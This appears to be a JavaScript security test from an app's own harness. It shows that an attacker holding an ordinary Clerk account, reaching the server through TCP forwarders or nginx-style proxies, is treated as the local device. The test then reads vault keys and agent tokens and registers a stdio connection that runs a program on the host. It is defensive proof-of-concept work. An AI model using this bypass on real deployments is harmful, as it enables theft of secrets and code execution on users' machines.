// P1: who is "device"? Root-workspace claim through header-less forwarders, using the REAL Clerk verifier
// (lib/clerk-app.mjs with a static JWKS standing in for Clerk's signing keys).
import { startLegacy, startMulti, writeMockStdio, rawHttp, clerkFixture, sandboxDir, result, workspaceId } from '../../harness.mjs';
import net from 'node:net';
import http from 'node:http';

process.on('unhandledRejection', (e) => result('UNHANDLED', String(e?.stack || e).slice(0, 300)));
process.on('uncaughtException', (e) => result('UNCAUGHT', String(e?.stack || e).slice(0, 300)));

const C = await clerkFixture({ hostname: 'renewing-bobcat-00.clerk.accounts.dev' });
const closers = [];

async function legacyRoot(label) {
  const dataDir = sandboxDir(label);
  const L = await startLegacy({ dataDir, password: 'original-owner-pass' });
  await L.api('/api/vault', { method: 'POST', body: { key: 'OWNER_GITHUB_TOKEN', value: 'ghp_owner_secret_value_123' } });
  const agentId = L.agent.id;
  const agentToken = L.agent.token;
  await L.close();
  return { dataDir, agentId, agentToken };
}

// TCP-level forwarder (socat / ssh -R / ngrok tcp / stunnel / HAProxy "mode tcp"): bytes pass through untouched.
async function tcpForwarder(target) {
  const srv = net.createServer((c) => { const u = net.connect(target, '127.0.0.1'); c.pipe(u); u.pipe(c); c.on('error', () => u.destroy()); u.on('error', () => c.destroy()); });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  closers.push(() => new Promise((r) => srv.close(r)));
  return srv.address().port;
}
// HTTP reverse proxy: rewrites Host to the upstream (nginx default `proxy_pass http://127.0.0.1:PORT;` uses $proxy_host)
// and adds whatever extra headers `add` names (e.g. X-Real-IP), but NOT X-Forwarded-For.
async function httpProxy(target, add = {}, rewriteHost = true) {
  const srv = http.createServer((req, res) => {
    const headers = { ...req.headers, ...add };
    if (rewriteHost) headers.host = `127.0.0.1:${target}`;
    const up = http.request({ host: '127.0.0.1', port: target, method: req.method, path: req.url, headers }, (r) => { res.writeHead(r.statusCode, r.headers); r.pipe(res); });
    up.on('error', () => { res.writeHead(502); res.end(); });
    req.pipe(up);
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  closers.push(() => new Promise((r) => { srv.close(r); srv.closeAllConnections?.(); }));
  return srv.address().port;
}

const json = (r) => { try { return JSON.parse(r.body); } catch { return r.body; } };

// ---------------------------------------------------------------- Scenario A: TCP forwarder, root unclaimed
try {
  const seed = await legacyRoot('rootA');
  const M = await startMulti({ dataDir: seed.dataDir, clerkApp: C.app });
  closers.push(() => M.close());
  const port = M.port;
  const azp = `http://127.0.0.1:${port}`;
  // The attacker signs up for their OWN account on the operator's Clerk app; azp is the Origin of the token request.
  const attacker = await C.sign({ sub: 'user_attacker', sid: 'sess_attacker', azp });
  const fwd = await tcpForwarder(port);
  const viaFwd = (route, opts = {}) => rawHttp({ port: fwd, path: route, method: opts.method || 'GET', body: opts.body,
    headers: { host: `127.0.0.1:${port}`, authorization: `Bearer ${attacker}`, ...(opts.body ? { 'content-type': 'application/json' } : {}), ...(opts.headers || {}) } });
  const st = await viaFwd('/api/auth/status');
  result('A.status via TCP forwarder (attacker, own Clerk account)', { status: st.status, ...json(st) });
  const vault = await viaFwd('/api/vault');
  result('A.attacker sees root vault keys', json(vault).secrets?.map((s) => s.key));
  const tokenRes = await viaFwd(`/api/agents/${seed.agentId}/token`);
  result('A.attacker reads root agent key (no password)', { status: tokenRes.status, equalsOwnersKey: json(tokenRes).token === seed.agentToken });
  const stdio = writeMockStdio();
  const add = await viaFwd('/api/mcps', { method: 'POST', body: { name: 'pwn', transport: 'stdio', command: stdio.command, args: stdio.args } });
  result('A.attacker adds stdio connection = runs a program on the host', { status: add.status, tools: json(add).mcp?.tools?.map((t) => t.name), err: json(add).mcp?.lastError });
  // Real owner arrives later directly on the Mac.
  const owner = await C.sign({ sub: 'user_owner', sid: 'sess_owner', azp });
  const ost = await rawHttp({ port, path: '/api/auth/status', headers: { authorization: `Bearer ${owner}` } });
  result('A.real owner on device afterwards', { workspace: json(ost).workspace, localAvailable: json(ost).localAvailable });
  const claim = await rawHttp({ port, path: '/api/auth/claim-local', method: 'POST', body: { password: 'original-owner-pass' }, headers: { authorization: `Bearer ${owner}`, 'content-type': 'application/json' } });
  result('A.owner claim-local with the CORRECT original password', { status: claim.status, body: json(claim) });
} catch (e) { result('A.error', String(e?.stack || e)); }

// ---------------------------------------------------------------- Scenario B: nginx-default HTTP proxy (Host rewritten, X-Real-IP only)
try {
  const seed = await legacyRoot('rootB');
  const M = await startMulti({ dataDir: seed.dataDir, clerkApp: C.app });
  closers.push(() => M.close());
  const port = M.port;
  const attacker = await C.sign({ sub: 'user_attacker', sid: 'sess_attacker', azp: `http://127.0.0.1:${port}` });
  const proxy = await httpProxy(port, { 'x-real-ip': '198.51.100.9' });
  const st = await rawHttp({ port: proxy, path: '/api/auth/status', headers: { host: 'loop.example.com', authorization: `Bearer ${attacker}` } });
  result('B.status via Host-rewriting proxy with X-Real-IP', { status: st.status, workspace: json(st).workspace, canImportLocal: json(st).canImportLocal });
} catch (e) { result('B.error', String(e?.stack || e)); }

// ---------------------------------------------------------------- Scenario C: device oracle for many proxy header styles (no claim needed)
// Unscoped /mcp answers 403 "device gateway is local only" when !device, and goes into the workspace (401 unknown key) when device.
try {
  const seed = await legacyRoot('rootC');
  const M = await startMulti({ dataDir: seed.dataDir, clerkApp: C.app });
  closers.push(() => M.close());
  const port = M.port;
  const variants = {
    'none (plain loopback)': {},
    'X-Forwarded-For': { 'x-forwarded-for': '198.51.100.9' },
    'Forwarded': { forwarded: 'for=198.51.100.9' },
    'X-Forwarded-Host': { 'x-forwarded-host': 'loop.example.com' },
    'X-Forwarded-For empty': { 'x-forwarded-for': '' },
    'X-Real-IP (nginx)': { 'x-real-ip': '198.51.100.9' },
    'Via (RFC 7230 proxies)': { via: '1.1 proxy' },
    'CF-Connecting-IP (cloudflare)': { 'cf-connecting-ip': '198.51.100.9' },
    'True-Client-IP (akamai/cf)': { 'true-client-ip': '198.51.100.9' },
    'Fly-Client-IP (fly.io)': { 'fly-client-ip': '198.51.100.9' },
    'X-Forwarded-Proto only': { 'x-forwarded-proto': 'https' },
    'X-Original-Forwarded-For': { 'x-original-forwarded-for': '198.51.100.9' },
    'Tailscale-User-Login': { 'tailscale-user-login': 'someone@example.com' },
  };
  const out = {};
  for (const [name, h] of Object.entries(variants)) {
    const r = await rawHttp({ port, method: 'POST', path: '/mcp', body: { jsonrpc: '2.0', id: 1, method: 'ping' },
      headers: { 'content-type': 'application/json', authorization: 'Bearer loop_' + 'x'.repeat(43), ...h } });
    // Off-device requests are refused as "local only", or (hosted) answered with the hosted key-routing
    // challenge "This Loop key is not recognized", which is never sent for requests from the Mac.
    const notDevice = (r.status === 403 && /local only/.test(r.body)) || (r.status === 401 && /key is not recognized/.test(r.body));
    out[name] = notDevice ? 'NOT device' : `DEVICE (${r.status})`;
  }
  result('C.device decision by forwarding header', out);
} catch (e) { result('C.error', String(e?.stack || e)); }

for (const c of closers.reverse()) await c().catch(() => {});
console.log('P1 DONE');
